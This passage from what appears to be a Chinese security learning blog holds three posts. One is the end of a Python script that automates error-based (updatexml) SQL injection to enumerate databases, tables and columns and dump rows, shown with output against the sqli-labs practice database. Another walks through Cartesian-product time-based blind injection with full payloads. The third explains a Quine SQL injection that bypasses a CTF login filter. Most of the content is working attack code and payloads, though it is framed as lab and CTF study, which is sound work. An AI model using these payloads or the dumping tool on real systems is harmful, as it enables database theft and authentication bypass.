db_names:\n                self.databases.extend(db_names)  # 将提取到底的数据库名添加到self.databases的表中\n\n        # 过滤常见系统数据库\n        system_dbs = ['information_schema', 'mysql', 'performance_schema', 'sys']\n        self.databases = [db for db in self.databases if db not in system_dbs]\n        # for db in self.databases，遍历 self.databases 列表中的每一个元素（即数据库名），临时变量 db 表示当前遍历的数据库名，保留满足条件的db名\n        print(\"[+] 可用数据库列表:\", self.databases)\n        return self.databases\n\n    def get_table_count(self, database):\n        # 获取指定数据库的表的数量\n        payload = f\" or updatexml(0,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema='{database}'),0x7e),1)--+\"\n        html = self.send_payload(payload)\n        result = self.extract_data(html)\n        return int(result[0]) if result else 0\n\n    def get_tables(self, database):\n        # 获取指定数据库的所有表名\n        count = self.get_table_count(database)\n        print(f\"[*] 数据库 {database} 有 {count} 个表\")\n\n        for i in range(count):\n            payload = f\" or updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema='{database}' limit {i},1),0x7e),1)--+\"\n            html = self.send_payload(payload)\n            table_names = self.extract_data(html)\n            if table_names:\n                self.tables.extend(table_names)\n\n        print(f\"[+] 数据库 {database} 的表列表:\", self.tables)\n        return self.tables\n\n    def get_column_count(self, table):\n        # 获取指定表的列数量\n        payload = f\" or updatexml(0,concat(0x7e,(select count(column_name) from information_schema.columns where table_name='{table}'),0x7e),1)--+\"\n        html = self.send_payload(payload)\n        result = self.extract_data(html)\n        return int(result[0]) if result else 0\n\n    def get_columns(self, table):\n        # 获取指定表的所有列名\n        count = self.get_column_count(table)\n        print(f\"[*] 表 {table} 有 {count} 个列\")\n\n        for i in range(count):\n            payload = f\" or updatexml(0,concat(0x7e,(select column_name from information_schema.columns where table_name='{table}' limit {i},1),0x7e),1)--+\"\n            html = self.send_payload(payload)\n            column_names = self.extract_data(html)\n            if column_names:\n                self.columns.extend(column_names)\n\n        print(f\"[+] 表 {table} 的列列表:\", self.columns)\n        return self.columns\n\n    def get_data_count(self, table):\n        # 获取指定表的数据的行数\n        payload = f\" or updatexml(0,concat(0x7e,(select count(*) from `{table}`),0x7e),1)--+\"\n        html = self.send_payload(payload)\n        result = self.extract_data(html)\n        return int(result[0]) if result else 0\n\n    def get_data(self, table, columns):\n        # 获取指定表的数据\n        count = self.get_data_count(table)\n        if count == 0:\n            print(f\"[!] 表 {table} 中没有数据或无法访问\")\n            return []\n\n        print(f\"[*] 表 {table} 有 {count} 行数据\")\n\n        for i in range(count):\n            # 获取多列数据，用~分隔\n            cols = \",\".join([f\"`{col}`\" for col in columns])\n            payload = f\" or updatexml(0,concat(0x7e,(select concat_ws(0x7e,{cols}) from `{table}` limit {i},1),0x7e),1)--+\"\n            html = self.send_payload(payload)\n            row_data = self.extract_data(html)\n            if row_data:\n                self.data.append(row_data[0].split('~'))\n\n        if not self.data:\n            print(\"[!] 获取数据失败，可能是权限不足或表结构特殊\")\n            return []\n\n        print(f\"[+] 表 {table} 的数据:\")\n        for row in self.data:\n            print(\" | \".join(row))\n\n        return self.data\n\ndef interactive_select(options, prompt):  #options: 一个列表，包含所有可供选择的选项，prompt: 字符串，显示给用户的提示信息\n    \"\"\"交互式选择菜单\"\"\"\n    print(\"\\n\" + prompt)\n    for i, opt in enumerate(options, 1): #格式化每个选项，使标号123与选项123对应\n        print(f\"{i}. {opt}\")\n    while True:\n        try:\n            choice = int(input(\"请选择(1-{}): \".format(len(options))))\n            if 1 <= choice <= len(options):\n                return options[choice - 1]\n            print(\"输入无效，请重新选择\")\n        except ValueError:\n            print(\"请输入数字\")\n\n\ndef main():\n    explorer = SQLiExplorer()\n\n    # 1. 获取所有数据库\n    explorer.get_databases()\n\n    if not explorer.databases:\n        print(\"[-] 未发现可用数据库\")\n        return\n\n    # 交互式选择数据库\n    target_db = interactive_select(explorer.databases, \"请选择要查询的数据库:\")\n\n    # 2. 获取选定数据库的所有表\n    explorer.get_tables(target_db)\n\n    if not explorer.tables:\n        print(f\"[-] 数据库 {target_db} 中没有表\")\n        return\n\n    # 交互式选择表\n    target_table = interactive_select(explorer.tables, f\"请选择要查询的表(数据库: {target_db}):\")\n\n    # 3. 获取选定表的所有列\n    explorer.get_columns(target_table)\n\n    if not explorer.columns:\n        print(f\"[-] 表 {target_table} 中没有列\")\n        return\n\n    # 选择要查询的列(多选)\n    print(\"\\n请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):\")\n    for i, col in enumerate(explorer.columns, 1):\n        print(f\"{i}. {col}\")\n    selected = input(\"选择列: \").split(',')\n    selected_columns = [explorer.columns[int(i) - 1] for i in selected if i.isdigit()]\n\n    if not selected_columns:\n        print(\"[-] 未选择有效列，默认查询前两列\")\n        selected_columns = explorer.columns[:2]\n\n    # 4. 获取表数据\n    explorer.get_data(target_table, selected_columns)\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n运行结果：\n\n````\n[*] 发现 9 个数据库\n[+] 可用数据库列表: ['cc', 'challenges', 'cvcv', 'security', 'sqlii']\n\n请选择要查询的数据库:\n1. cc\n2. challenges\n3. cvcv\n4. security\n5. sqlii\n请选择(1-5): 4\n[*] 数据库 security 有 4 个表\n[+] 数据库 security 的表列表: ['emails', 'referers', 'uagents', 'users']\n\n请选择要查询的表(数据库: security):\n1. emails\n2. referers\n3. uagents\n4. users\n请选择(1-4): 4\n[*] 表 users 有 11 个列\n[+] 表 users 的列列表: ['id', 'name', 'username', 'password', 'type', 'USER', 'CURRENT_CONNECTIONS', 'TOTAL_CONNECTIONS', 'id', 'username', 'password']\n\n请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):\n1. id\n2. name\n3. username\n4. password\n5. type\n6. USER\n7. CURRENT_CONNECTIONS\n8. TOTAL_CONNECTIONS\n9. id\n10. username\n11. password\n选择列: 3\n[*] 表 users 有 13 行数据\n[+] 表 users 的数据:\nDumb\nAngelina\nDummy\nsecure\nstupid\nsuperman\nbatman\nadmin\nadmin1\nadmin2\nadmin3\ndhakkan\nadmin4\n\n````\n\n\n\n\n"},{"title":"笛卡尔积-时间盲注","url":"/2025/04/24/笛卡尔积-时间盲注/","content":"### 笛卡尔积\n\n原理：连接表是一个很耗时的操作（A×B=A和B中每个元素的组合所组成的集合，就是连接表）\n\n````\nSELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;\n````\n\n**靶场实践**（`sqli-9`）\n\n````\n?id=1 ' and if(length((select database()))>7,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+\n````\n\n![image-20250424213321067](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133119.png)\n\n页面延迟回显\n\n![image-20250424213359282](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133309.png)\n\n页面直接回显，说明书库名的长度为7.\n\n接下来查询数据库\n\n````\n?id=1 ' and if(ascii(substr(database(),1,1))>114,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+\n````\n\n![image-20250424213424502](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134537.png)\n\n页面延迟回显\n\n![image-20250424213441011](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134040.png)\n\n页面立刻回显\n\n说明数据库名的第一个字符串对应的`ascii`码的值为115，则第一个字符串为‘s’。\n\n以此类推可以得到完整的数据库名为security。\n\n接下来查询第一个表名的长度\n\n````\n?id=1 ' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+\n````\n\n![image-20250424213458517](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134550.png)\n\n页面延迟回显\n\n![image-20250424213513579](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135609.png)\n\n页面立刻出现回显，说明第一个表名的长度为6。\n\n接下来查询第一个表名\n\n````\n?id=1 ' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+\n````\n\n![image-20250424213532389](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135425.png)\n\n页面延迟回显\n\n![image-20250424213545009](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135042.png)\n\n页面立刻回显，说明表名的第一个字符对应的`ascii`码的值为101.\n\n更改`substr()`函数的参数可以得到完整的表名。\n\n依次类推，按照上面的方法可以得到列名以及列的内容，这里写一下具体的查询列的内容的查询语句\n\n````\n?id=1 ' and if(length((select username from users limit 0,1))>3,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+\n````\n\n![image-20250424213602897](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png)\n\n页面延迟回显\n\n![image-20250424213616364](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136397.png)\n\n页面立刻回显\n\n说明`username`列的第一个数据的长度是4\n\n接下来查询这个列中的第一个字符。\n\n````\n?id=1 ' and if(ascii(substr((select username from users limit 0,1),1,1))>67,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+\n````\n\n![image-20250424213635556](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136590.png)\n\n页面延迟回显\n\n![image-20250424213648892](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png)\n\n页面立刻回显\n\n说明`username`列的第一个数据的第一个字符对应的`ascii`码的之为68，\n\n以此类推可以的得到完整的数据。\n"},{"title":"Quine","url":"/2025/04/24/Quine/","content":"# 简介\n\n`Quine`又叫做自产生程序，在`sql`注入技术中，这是一种是的输入的`SQL`\n\n语句与输出的`SQL`语句一致的技术，常用于一些特殊的登陆绕过`sql`注入中。\n\n\n\n\n\n实践\n\n```\nfunction checkSql($s) {\n    if(preg_match(\"/regexp|between|in|flag|=|>|<|and|\\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\\\\$|0x|sleep|\\ /i\",$s)){\n        alertMes('hacker', 'index.php');\n    }\n}\n\nif (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {\n    $username=$_POST['username'];\n    $password=$_POST['password'];\n    if ($username !== 'admin') {\n        alertMes('only admin can login', 'index.php');\n    }\n    checkSql($password);\n    $sql=\"SELECT password FROM users WHERE username='admin' and password='$password';\";\n    $user_result=mysqli_query($con,$sql);\n    $row = mysqli_fetch_array($user_result);\n    if (!$row) {\n        alertMes(\"something wrong\",'index.php');\n    }\n    if ($row['password'] === $password) {\n    die($FLAG);\n    } else {\n    alertMes(\"wrong password\",'index.php');\n  }\n}\n```\n\n观察这个源码，存在一个看似很明显的`SQL`注入，黑名单中还有许多的过滤。\n\n例如：\n\nlike替换'=',benchmark()替换sleep函数，mid()函数替换`substr()`函数，/**/替换空格。\n\n下面是注入的payload\n\n```\nunion select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),{},1)) like {}),(select benchmark(4999999,md5('test'))),1)#\n```\n\n（`sys.schema_table_statistics_with_buffer`是`Mysql`数据库中的一个系统视图，提供了数据库中的表哦的统计信息和缓冲池的使用情况）\n\n这样注入得到的表中并没有密码。\n\n再观察源码\n\n```\n$sql=\"SELECT password FROM users WHERE username='admin' and password='$password';\";\n$user_result=mysqli_query($con,$sql);\n$row = mysqli_fetch_array($user_result);\n\nif ($row['password'] === $password) {\n    die($FLAG);\n```\n\n简单说说就是`sql`查询得到的结果与password相等，那么除了正常的逻辑的密码相同会产生相等，如果我们的输入与最后的结果，一样可以绕过验证，这就是`Quine`。\n\n```\nREPLACE ( string1 , string2 , string3 )\n```\n\n首先要知道replace函数的三个参数，第一个参数是要替换的整个字符串，第二个参数被替换的字符(串) ，第三个是要替换成的字符(串)\n\n直接分析这个地方使用`Quine`技术的payload\n\n```\nunion/**/SELECT/**/REPLACE(REPLACE('\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#\n```\n\n首先是一个大的REPLACE(),令他为A\n\n```\nREPLACE('\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39))\n```\n\n其中有一个字符串，令他为B\n\n```\n\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#\n```\n\n则最初的payload就为\n\n```\nunion/**/SELECT/**/REPLACE(A,CHAR(46),B)/**/AS/**/ch3ns1r#\n\nA：REPLACE('B',CHAR(34),CHAR(39))\nB：\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#\n```\n\n下面这个就是`Quine`的基本形式了\n\n```\nREPLACE(A,CHAR(46),B)  ----char(46)= .   char(34)=\"   char(39)='\n```\n\n外层replace()：将双引号char(34)双引号替换为char(39)单引号。\n\n内层replace():  将点号char(46)替换为整个payload字符串。\n\n举个例子：\n假设一个`str`为（）\n\n```\nREPLACE(\".\",CHAR(46),\".\")\n```\n\n最后的语句为：\n\n```\nREPLACE('REPLACE(\".\",CHAR(46),\".\")',CHAR(46),'REPLACE(\".\",CHAR(46),\".\")')\n```\n\n首先执行char(46)得到的是点号，然后执行replace()\n\n最后得到的结果是：\n\n```\nREPLACE('REPLACE(\".\",CHAR(46),\".\")',CHAR(46),'REPLACE(\".\",CHAR(46),\".\")')\n```\n\n将`str1`中的点号都替换为了`str`\n\n\n\n\n\n最后再详细的解释一下最开始的payload\n\n```\n'/**/union/**/SELECT/**/REPLACE(REPLACE('\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#\n```\n\n完整的结构为：\n\n```\nREPLACE(\n  REPLACE(\n    '原Payload字符串',\n    CHAR(34),  -- 替换双引号为单引号\n    CHAR(39)\n  ),\n  CHAR(46),    -- 替换点号(.)为新的Payload\n  '新Payload字符串'\n)\n```\n\n首先执行内层的replace()\n\n```\nREPLACE(\n    '原Payload字符串',\n    CHAR(34),  -- 替换双引号为单引号\n    CHAR(39)\n  )\n\n原Payload字符串：\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#\n```\n\n得到的结果为：\n\n```\n'/**/union/**/SELECT/**/REPLACE(REPLACE('.',CHAR(34),CHAR(39)),CHAR(46),'.')/**/AS/**/ch3ns1r#\n```\n\n再执行外部的replace\n\n```\nREPLACE(\n  第一次的结果,\n  CHAR(46),    -- 替换点号(.)为新的Payload\n  '新Payload字符串'\n)\n```\n\n得到的结果为：\n\n```\n'/**/union/**/SELECT/**/REPLACE(REPLACE('\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'\"/**/union/**/SELECT/**/REPLACE(REPLACE(\".\",CHAR(34),CHAR(39)),CHAR(46),\".\")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#'\n```\n\n**精妙的地方：**\n\n通过内层的replace()将单引号全部转化为了双引号从而解决了符号的问题。\n","tags":["基本认识"]},{"title":"404","url":"//404.html"},{"title":"关于我","url":"/about/index.html"},{"title":"搜索","url":"/search/index.html"},{"title":"分类","url":"/categories/index.html"},{"title":"标签","url":"/tags/index.html"}]